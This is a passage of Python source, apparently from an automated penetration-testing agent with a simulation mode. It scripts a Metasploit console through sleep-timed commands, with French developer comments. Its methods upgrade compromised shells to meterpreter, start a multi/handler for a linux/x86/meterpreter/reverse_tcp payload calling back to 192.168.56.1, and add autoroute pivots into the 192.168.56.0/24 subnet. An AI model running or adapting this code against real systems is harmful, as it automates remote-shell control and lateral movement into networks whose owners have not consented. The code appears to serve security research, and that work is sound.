            time.sleep(4)
            self.console.execute('set SESSION '+ self.session)
            time.sleep(4)
            self.console.execute('run')
            time.sleep(25) 
            #TOUTE CETTE PREMIERE PARTIE JE PEUX LA METTRE DANS UNE FONCTION A PART
            
            a= self.success
            c= self.action_in_the_right_shell
            
            if a and c:
                print('\n1\n')
                print('SESSION WTF: '+ self.session)
                self.console.execute('sessions -i ' + self.session)
                time.sleep(5)
                self.console.execute('run autoroute -s 192.168.56.0/24') # A MODIFIER, IL FAUT UN ATTRIBUT self.subnet
                time.sleep(15)
                a= self.success
                
                self.console.execute('background')
                time.sleep(5)
                
                if a:
                    return True, 'Not root'
                else:
                    return False, 'Not root'
                
            else:
                print('\n2\n')
                return False, 'Not root'
        
        else:
            print('\n3\n')
            return False, 'Not root'
        
    def pivot_autoroute_3(self):
        self.console.execute('sessions -u '+ str(self.session))
        time.sleep(5)
            
        a= self.success
        c= self.action_in_the_right_shell
        
        if a and c:
            print('\n1\n')
            print('SESSION WTF: '+ self.session)
            self.console.execute('sessions -i ' + self.session)
            time.sleep(5)
            self.console.execute('run autoroute -s 192.168.56.0/24') # A MODIFIER, IL FAUT UN ATTRIBUT self.subnet
            time.sleep(15)
            a= self.success
            
            self.console.execute('background')
            time.sleep(5)
            
            if a:
                return True, 'Not root'
            else:
                return False, 'Not root'
            
        else:
            print('\n2\n')
            return False, 'Not root'
        
    def pivot_autoroute_4(self):
        if self.simulation==False:
            self.console.execute('use multi/handler')
            time.sleep(5)
            c= self.action_in_the_right_shell
            
            if c:
                self.console.execute('set LPORT 46550')
                time.sleep(5)
                self.console.execute('set LHOST 192.168.56.1')
                time.sleep(5)
                self.console.execute('set payload linux/x86/meterpreter/reverse_tcp')
                time.sleep(5)
                self.console.execute('run -j')
                time.sleep(8)
                
                #self.console.execute('sessions -u '+ str(self.session))
                self.console.execute('use multi/manage/shell_to_meterpreter')
                time.sleep(8)
                self.console.execute('set LPORT 46550')  # LAISSER CE LPORT ??
                time.sleep(4)
                self.console.execute('set LHOST 192.168.56.1')  
                time.sleep(4)
                self.console.execute('set SESSION '+ self.session)
                time.sleep(4)
                self.console.execute('set HANDLER false ')
                time.sleep(4)
                self.console.execute('run')
                time.sleep(15) 
                #TOUTE CETTE PREMIERE PARTIE JE PEUX LA METTRE DANS UNE FONCTION A PART
                
                a= self.success
                c= self.action_in_the_right_shell
                
                if a and c:
                    
                    self.console.execute('jobs')
                    time.sleep(4)
                    while self.no_active_jobs==False:
                        self.console.execute('sessions -k '+ self.session)
                        time.sleep(4)
                        self.console.execute('run')
                        time.sleep(6)
                        self.console.execute('jobs')
                        time.sleep(4)
                        
                    
                    print('\n1\n')
                    print('SESSION WTF: '+ self.session)
                    
                    self.console.execute('use post/multi/manage/autoroute')
                    time.sleep(8)
                    self.console.execute('set subnet 192.168.56.0') # A MODIFIER, IL FAUT UN ATTRIBUT self.subnet
                    time.sleep(4)
                    self.console.execute('set session '+ str(self.session))
                    time.sleep(4)
                    self.console.execute('run')
                    time.sleep(20)
                    a= self.success
                    
                    if a:
                        return True, 'Not root'
                    else:
                        return False, 'Not root'
                    
                else:
                    print('\n2\n')
                    return False, 'Not root'
            
            else:
                print('\n3\n')
                return False, 'Not root'
        
        else: #cas self.simulation==True
            result= self.simulation_environment.pivot_autoroute()
            self.read_simulated_console(result)
            
            c= self.action_in_the_right_shell
            
            if c:
                
                a= self.success
                
                return a, 'Not root'
            
            else:
                print('\n3\n')
                return False, 'Not root'

        
    def ls(self):
        self.console.execute('ls')
        time.sleep(3)
        self.console.execute('whoami')
        time.sleep(3)
#        self.console.execute('background') # à modifier ?
#        time.sleep(4)
#        self.console.execute('y') # à modifier ?
        
        return True, 'Not root' # ls est juste une fonction de test c'est pourquoi je retourne n'importe quoi. A modifier
    
    
    